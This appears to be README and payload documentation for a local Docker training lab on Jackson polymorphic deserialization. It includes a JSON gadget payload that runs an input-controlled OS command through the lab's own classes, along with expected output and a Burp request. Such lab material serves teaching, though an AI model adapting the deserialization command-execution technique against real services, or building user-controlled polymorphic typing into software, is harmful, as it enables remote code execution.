# Jackson: only `resp` in the HTTP response

The Jackson service on `http://127.0.0.1:8081` accepts **raw JSON** at `POST /api/deserialize`. Both examples use the same endpoint and the same **Run** button.

## Normal JSON

```json
{"@class":"java.util.LinkedHashMap","message":"hello"}
```

Expected HTTP response:

```json
{"resp":"hello"}
```

## Custom gadget command-execution example

```json
{"@class":"lab.WorkflowEnvelope","router":{"@class":"lab.TaskRouter","action":{"@class":"lab.ProcessAction","command":"id"}}}
```

Expected HTTP response *if the OS process executes successfully* (UID/GID varies):

```json
{"resp":"uid=10001(lab) gid=999(lab) groups=999(lab)"}
```

Only actual lines emitted as `[os stdout]` are included in `resp`; there is no fabricated success output. Gadget debug traces are no longer exposed via this HTTP response. Errors also use `{ "resp": "Error: ..." }` with corresponding HTTP status for validation exceptions.

Rebuild the Jackson service:

```powershell
docker compose up -d --build --force-recreate java
```

The gadget classes are purpose-built training classes, **not** an XBean CVE-2020-8840 exploit.

---

# Jackson custom gadget RCE lab (8081)

**This is a deliberately custom gadget, not an exploit for CVE-2020-8840.** XBean is retained in the Maven dependencies only for historical study. The working command-execution path uses the lab's own `lab.*` classes.

Run from repository root:

```powershell
docker compose up --build -d
```

Open http://127.0.0.1:8081 and paste the content of either `normal.json` or `payload.json` in the single input box. Click **Run**.

## Normal input

```json
{"@class":"java.util.LinkedHashMap","message":"hello-from-jackson","count":1}
```

Expected output contains `java.util.LinkedHashMap` and the supplied values, but no `[os stdout]` line.

## RCE lab input

```json
{
  "@class": "lab.WorkflowEnvelope",
  "router": {
    "@class": "lab.TaskRouter",
    "action": {
      "@class": "lab.ProcessAction",
      "command": "id"
    }
  }
}
```

Expected trace: `[4] ProcessAction.setCommand`, `[2] TaskRouter.setAction`, `[1] WorkflowEnvelope.setRouter`, `[3] TaskRouter.dispatch`, `[5] ProcessAction.execute`, followed by `[os stdout] uid=...` and `[os exit] 0`. The exact UID depends on the container runtime.

`command` is controlled by the input, not hard-coded into the gadget. The process is confined by Docker Compose's non-root user, read-only filesystem, dropped capabilities, resource limits, and local-only port binding.

**Technical distinction:** This demonstrates why accepting user-controlled polymorphic types plus side-effecting setters is dangerous. It does not establish that XBean's published gadget chain or a historical CVE is exploitable in this image. These are different claims.

**Docker verification:** These examples are expected behavior based on the code; actual image build/runtime has not been verified here.


## HTTP JSON endpoint (Burp Repeater)

The browser UI at http://127.0.0.1:8081 sends **raw JSON** to `POST /api/deserialize`. The Java application now reads multiline JSON from stdin, not just the first line.

```http
POST /api/deserialize HTTP/1.1
Host: 127.0.0.1:8081
Content-Type: application/json

{
  "@class": "java.util.LinkedHashMap",
  "message": "hello"
}
```

Response: HTTP JSON object with `status`, `facts`, `stdout`, `stderr`, and `trace`. `GET /healthz` returns process health. The gadget payload is documented in `payloads.md`.

If you get `ERR_EMPTY_RESPONSE`, check `docker compose ps`, `docker compose logs --tail=100 java`, and `curl.exe -v http://127.0.0.1:8081/healthz`. An empty response cannot be diagnosed definitively without container logs.
